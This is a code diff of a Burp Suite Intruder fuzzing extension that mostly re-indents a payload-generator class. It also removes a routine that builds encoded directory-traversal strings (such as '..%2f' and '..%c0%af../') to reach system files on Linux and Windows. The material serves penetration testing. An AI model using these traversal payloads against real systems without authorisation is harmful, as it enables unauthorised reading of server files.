-			1.175494210692441075487029444849287348827052428745893333857174530571588870475618904265502351336181163787841796875E-38,
-			2.2250738585072011e-308
-		]
-
-		edgeCases = []
-
-		for vals in [values, ieee754trickery]:
-			edgeCases.extend([float(x) for x in vals] + [float(-x) for x in vals])
-
-		out = [str(x) for x in edgeCases]
-		out.extend([
-			'Inf', 
-			'Infinity', 
-			'NaN', 
-			'0..0',
-			'.',
-			'0.0.0',
-			'0,00',
-			'0,,0',
-			'1#INF',
-			'1#IND',
-
-		])
-
-		return out
-
-	def pathMutator(self, data):
-		# Number of mutations to generate:
-		# 	num = 2 * len(files) * len(dotTemplates) * depth
-		depth = 8
-		dotTemplates = {
-			'linux': (
-				'../', '..%2f', '%2e%2e%2f', '..%252f', '..%c0%af../'
-			), 
-			'windows': (
-				'..\\', '..%5c', '%2e%2e%5c', '..%255c', '..%c0%af..\\'
-			)
-		}
-
-		slashes = {
-			'linux' : '/',
-			'windows' : '\\',
-		}
-
-		for os in ['linux', 'windows']:
-			slash = slashes[os]
-			dots = dotTemplates[os]
-			files = PATH_TRAVERSAL_FILES[os]
-
-			for file in files:
-				for i in range(depth):
-					path = dots * i + slash + file
-					self.mutations.append(path)
-					self.mutations.append(slash + path)
-
-
-	def getMutations(self, data):
-		self.genericMutations(data)
-
-		varType = self.findType(data)
-
-		if varType == 'string':
-			self.stringMutator(data)
-
-		elif varType == 'integer':
-			self.integerMutator(data)
-
-		elif varType == 'path':
-			self.pathMutator(data)
-
-		return self.mutations
-
-class JSONTypeFuzzer(BaseFuzzer):
-	def name(self):
-		return 'JSON'
-
-	def reset(self):
-		pass
-
-	def check(self, data):
-		try:
-			json.loads(data)
-			return True
-		except ValueError:
-			return False
-
-	def getMutations(self, data):
-		print('[!] JSONTypeFuzzer.getMutations not implemented yet. Returning BasciTypeFuzzer mutations.')
-
-		validJson = json.loads(data)
-		mutations = []
-		fuzzer = BasicTypeFuzzer()
-
-		return fuzzer.getMutations(data)
 
 
 # =============================================
@@ -876,63 +1145,66 @@ class JSONTypeFuzzer(BaseFuzzer):
 #
 
 class ContextAwareFuzzer(IIntruderPayloadGenerator):
-	def __init__(self, extender, attack):
-		self._extender = extender
-		self._attack = attack
-		self._helpers = extender._helpers
+    def __init__(self, extender, attack):
+        self._extender = extender
+        self._attack = attack
+        self._helpers = extender._helpers
 
-		self.mutations = []
-		self.payloadsToGenerate = 10
-		self.payloadsGenerated = 0
+        self.mutations = []
+        self.payloadsToGenerate = 10
+        self.payloadsGenerated = 0
 
-		self.typeHandlers = (
-			JSONTypeFuzzer(),
+        self.typeHandlers = (
+            JSONTypeFuzzer(),
 
-			# The most generic type fuzzer must be last one
-			BasicTypeFuzzer(),
-		)
+            # The most generic type fuzzer must be last one
+            BasicTypeFuzzer(),
+        )
 
-	def hasMorePayloads(self):
-		return (self.payloadsGenerated < self.payloadsToGenerate)
+    def hasMorePayloads(self):
+        return (self.payloadsGenerated < self.payloadsToGenerate)
 
-	def getNextPayload(self, currentPayload):
-		payload = self._helpers.bytesToString(currentPayload)
+    def getNextPayload(self, currentPayload):
+        payload = self._helpers.bytesToString(currentPayload)
 
-		reencode = ReEncoder()
-		payload = reencode.decode(payload)
+        reencode = ReEncoder()
+        payload = reencode.decode(payload)
 
-		payload = self.mutatePayload(payload)
-		self.payloadsGenerated += 1
+        payload = self.mutatePayload(payload)
+        self.payloadsGenerated += 1
 
-		return reencode.encode(payload)
+        return reencode.encode(payload)
 
-	def reset(self):
-		self.payloadsGenerated = 0
-		self.mutations = []
+    def reset(self):
+        self.payloadsGenerated = 0
+        self.mutations = []
 
-		for typeHandler in self.typeHandlers:
-			typeHandler.reset()
+        for typeHandler in self.typeHandlers:
+            typeHandler.reset()
 
-		print('[.] Reset.')
+        print('[.] Reset.')
 
-	def prepareMutations(self, payload):
-		for typeHandler in self.typeHandlers:
-			if typeHandler.check(payload):
-				return typeHandler.getMutations(payload)
+    def prepareMutations(self, payload):
+        for typeHandler in self.typeHandlers:
+            if typeHandler.check(payload):
+                print('[.] Payload "{}" will be handled by: {}'.format(
+                    payload, typeHandler.name()
+                ))
+                return typeHandler.getMutations(payload)
 
-		return []
+        return []
 
-	def mutatePayload(self, payload):
-		if len(self.mutations) == 0:
-			print('[.] Generating mutations for: "{}"'.format(payload))
-			
-			self.mutations = self.prepareMutations(payload)
-			self.payloadsToGenerate = len(self.mutations)
-			
-			print('[.] Generated {} mutations'.format(len(self.mutations)))
+    def mutatePayload(self, payload):
+        if len(self.mutations) == 0:
+            print('[.] Generating mutations for: "{}"'.format(payload))
+            
+            self.mutations = self.prepareMutations(payload)
+            self.payloadsToGenerate = len(self.mutations)
+            
+            print('[.] Generated {} mutations'.format(len(self.mutations)))
 
-		#print('[>] Returning mutation {}: "{}"'.format(
-		#	self.payloadsGenerated, self.mutations[self.payloadsGenerated]
-		#))
+        #print('[>] Returning mutation {}: "{}"'.format(
+        #   self.payloadsGenerated, self.mutations[self.payloadsGenerated]
+        #))
 
-		return self.mutations[self.payloadsGenerated]
+        return self.mutations[self.payloadsGenerated]
